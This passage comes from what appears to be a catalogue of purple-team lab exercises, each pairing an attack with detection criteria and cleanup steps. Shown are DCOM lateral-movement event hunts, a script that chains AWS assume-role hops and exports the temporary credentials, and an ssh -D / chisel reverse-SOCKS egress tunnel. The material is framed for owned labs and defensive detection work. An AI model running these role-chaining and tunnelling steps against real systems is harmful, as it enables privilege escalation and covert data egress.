Write-Host '    - Sysmon EID 1 with ParentImage = mmc.exe / dllhost.exe (COM surrogate).'
Write-Host '    Sample hunt:'
Write-Host '      Get-WinEvent -FilterHashtable @{LogName="System";ProviderName="Microsoft-Windows-DistributedCOM"} |'
Write-Host '        Where-Object { $_.Id -ge 10000 -and $_.Id -le 10030 }'
Write-Host '      Get-WinEvent -FilterHashtable @{LogName="Security";Id=4688} |'
Write-Host '        Where-Object { $_.Message -match "mmc.exe" -and $_.Message -match "cmd.exe|powershell" }'
CR-dcom-lateral.success_criterion: On the owned lab host the reference (with the commented activation enabled) writes the benign hostname proof file remotely; detection confirms via DistributedCOM 10000-series + Event 4688 (mmc.exe spawning cmd.exe) and a preceding 4624 Type 3 — proving the DCOM lateral-activation seam.
CR-dcom-lateral.cleanup: Delete C:\lab_dcom_proof.txt on the target, close any spawned processes, review DCOM/Firewall hardening on the lab host.
CR-dcom-lateral.safety: Built-in PUBLIC COM-activation reference against an OWNED lab host, benign hostname-write proof, activation line defanged (commented) + 10000-series/4688 detection; no malware authored.

CR-assume-role-chain.name: STS assume-role chain walk — read-only role-hop enumeration in an owned account
CR-assume-role-chain.setup: local AD/host lab: the operator's OWN AWS lab account with two test roles where role A may assume role B (the over-permissive trust = seam). Read-only: GetCallerIdentity at each hop, no resource changes. Falls back to a dry-run printout if no credentials present.
CR-assume-role-chain.script:
#!/usr/bin/env bash
# AUTHORIZED OWNED-ACCOUNT ONLY. Walks an STS assume-role CHAIN read-only to expose an over-permissive
# role-trust seam (role A -> role B). No mutations: only sts:AssumeRole + GetCallerIdentity. Owned lab account.
set -euo pipefail
ROLE_B_ARN="${1:-arn:aws:iam::000000000000:role/lab-role-B}"   # OWNED lab role
if ! command -v aws >/dev/null; then echo '[!] aws CLI not installed — dry-run reference only'; fi
echo '[*] Hop 0 — current identity (read-only):'
aws sts get-caller-identity 2>/dev/null || echo '    (no creds; reference command: aws sts get-caller-identity)'
echo "[*] Hop 1 — attempt to assume OWNED lab role: $ROLE_B_ARN"
CREDS_JSON=$(aws sts assume-role --role-arn "$ROLE_B_ARN" --role-session-name lab-chain-walk 2>/dev/null || true)
if [ -n "$CREDS_JSON" ]; then
  export AWS_ACCESS_KEY_ID=$(echo "$CREDS_JSON" | python3 -c 'import sys,json;print(json.load(sys.stdin)["Credentials"]["AccessKeyId"])')
  export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS_JSON" | python3 -c 'import sys,json;print(json.load(sys.stdin)["Credentials"]["SecretAccessKey"])')
  export AWS_SESSION_TOKEN=$(echo "$CREDS_JSON" | python3 -c 'import sys,json;print(json.load(sys.stdin)["Credentials"]["SessionToken"])')
  echo '[*] Hop 1 identity after assume (read-only):'
  aws sts get-caller-identity
  echo 'RESULT: role-chain hop SUCCEEDED -> over-permissive AssumeRole trust seam confirmed.'
else
  echo '    reference: aws sts assume-role --role-arn '"$ROLE_B_ARN"' --role-session-name lab-chain-walk'
  echo '    (no chain established; either creds absent or trust correctly scoped = PASS)'
fi
echo '[*] DETECTION criterion: CloudTrail AssumeRole events forming a chain (one session assuming the next),'
echo '    especially sts:GetCallerIdentity hops across roles from a single session/source = role-chaining signal.'
CR-assume-role-chain.success_criterion: GetCallerIdentity returns role-B's ARN after the assume-role hop (read-only) — confirms an over-permissive AssumeRole trust path (seam). Detection: CloudTrail AssumeRole events chaining one session into the next from a single source = role-chaining signal.
CR-assume-role-chain.cleanup: Unset the exported AWS_* session vars (they are temporary STS creds that auto-expire); no resources created. Tighten the lab role trust policy afterward.
CR-assume-role-chain.safety: Read-only STS calls (assume-role + get-caller-identity) in the operator's OWN lab account, no resource mutation + CloudTrail detection (reference/detection, no-malware design).

CR-socks-tunnel.name: SOCKS egress tunnel — ssh -D / chisel loopback proving protocol-conformant egress
CR-socks-tunnel.setup: local AD/host lab: all on loopback / RFC1918. A local SOCKS proxy (ssh -D, or chisel reference) tunnels a request to a local HTTP server bound to 127.0.0.1, proving an egress tunnel carries traffic inside a benign protocol. No external targets.
CR-socks-tunnel.script:
#!/usr/bin/env bash
# AUTHORIZED LAB ONLY (loopback/RFC1918). Proves an egress SOCKS tunnel relays app traffic that looks
# protocol-conformant. Stands up a local HTTP server + a local SOCKS proxy and routes through it.
# No external/internet targets. chisel reference shown for the client/server variant.
set -euo pipefail
# 1) Local 'internal' service the tunnel will reach (RFC1918/loopback only)
python3 -m http.server 8099 --bind 127.0.0.1 >/tmp/lab_http.log 2>&1 &
HTTP_PID=$!; sleep 1
# 2) Local SOCKS proxy via ssh dynamic forward to loopback (the egress tunnel)
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -fN -D 127.0.0.1:1080 localhost 2>/dev/null && SSH_OK=1 || SSH_OK=0
if [ "$SSH_OK" = 1 ]; then
  echo '[*] SOCKS proxy up on 127.0.0.1:1080 (ssh -D). Routing curl THROUGH the tunnel:'
  OUT=$(curl -s --socks5-hostname 127.0.0.1:1080 http://127.0.0.1:8099/ || true)
  echo "$OUT" | head -3
  [ -n "$OUT" ] && echo 'RESULT: traffic reached the internal service THROUGH the SOCKS tunnel -> egress-tunnel seam confirmed.'
else
  echo '[!] sshd not enabled on lab box. chisel reference (run in owned lab):'
  echo '    server: chisel server --port 9000 --reverse        # on the lab pivot host'
  echo '    client: chisel client 127.0.0.1:9000 R:socks       # opens a reverse SOCKS over HTTP'
  echo '    then:   curl --socks5-hostname 127.0.0.1:1080 http://127.0.0.1:8099/'
fi
echo '[*] DETECTION criterion: long-lived single connection carrying disproportionate/steady traffic,'
echo '    SOCKS/CONNECT patterns, or HTTP tunnels to an unusual host (NetFlow beacon/duration anomaly);'
echo '    Sysmon EID 3 for ssh.exe/chisel making outbound connections.'
# teardown
kill $HTTP_PID 2>/dev/null || true
pkill -f 'ssh .*-D 127.0.0.1:1080' 2>/dev/null || true
CR-socks-tunnel.success_criterion: curl routed via the local SOCKS proxy retrieves the loopback HTTP server's directory listing — proves the tunnel relays protocol-conformant traffic through an egress channel (seam). Detection: long-lived connection with steady volume / SOCKS-CONNECT patterns / Sysmon EID 3 for ssh/chisel = tunnel signal.
CR-socks-tunnel.cleanup: Script kills the local http.server and the ssh -D process; for chisel, stop the client/server processes. All loopback, nothing persistent.
CR-socks-tunnel.safety: Loopback/RFC1918 only, local HTTP server target, public-tool (ssh -D / chisel) reference with built-in teardown + NetFlow/Sysmon detection (reference/detection, no-malware design).
